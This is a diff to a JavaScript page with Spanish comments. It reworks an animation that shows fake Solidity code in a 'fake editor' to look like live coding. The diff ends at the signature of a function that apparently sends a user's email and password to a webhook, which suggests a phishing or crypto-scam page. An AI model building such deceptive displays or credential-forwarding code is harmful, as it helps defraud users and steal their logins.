@@ -265,7 +265,6 @@ function iniciarContador() {
 function mostrarFakeEditor() {
     const editor = document.getElementById('fakeEditor');
     editor.style.display = 'block';
-    editor.textContent = ""; // Limpia el editor antes de empezar
 
     // Generar comandos falsos de Solidity
     let fakeCodeLines = [
@@ -296,19 +295,32 @@ function mostrarFakeEditor() {
         "}"
     ];
 
-    // Función que simula la escritura de texto, actualizando con 5 líneas más de código cada vez
-    let currentLine = 0;
-    let updateCode = () => {
-        let endLine = Math.min(currentLine + 5, fakeCodeLines.length);
-        for (; currentLine < endLine; currentLine++) {
-            editor.textContent += fakeCodeLines[currentLine] + '\n';
+    // Función que limpia el editor y muestra un nuevo conjunto de líneas
+    function updateCode(linesToShow) {
+        editor.textContent = ""; // Limpia el editor antes de cada actualización
+        let endLine = Math.min(linesToShow, fakeCodeLines.length);
+        for (let i = 0; i < endLine; i++) {
+            editor.textContent += fakeCodeLines[i] + '\n';
         }
-        if (currentLine < fakeCodeLines.length) {
-            setTimeout(updateCode, 1000); // Espera 1 segundo antes de agregar más líneas
+        // Decide aleatoriamente cuántas líneas mostrar en el siguiente ciclo
+        let nextLinesToShow = Math.floor(Math.random() * 5) + 1; // Entre 1 y 5 líneas
+        if (endLine < fakeCodeLines.length) {
+            setTimeout(() => updateCode(nextLinesToShow), 2000); // Espera 2 segundos antes de actualizar
         }
-    };
+    }
 
-    updateCode(); // Inicia la simulación de tipeo
+    // Simula el efecto de "pensamiento" al inicio
+    editor.textContent = "Cargando editor";
+    let dots = 0;
+    let loadingInterval = setInterval(() => {
+        if (dots < 3) {
+            editor.textContent += '.';
+            dots++;
+        } else {
+            clearInterval(loadingInterval);
+            updateCode(5); // Comienza mostrando 5 líneas
+        }
+    }, 500); // Medio segundo entre puntos
 }
 
 function enviarDatosAWebhook(email, contrasena) {
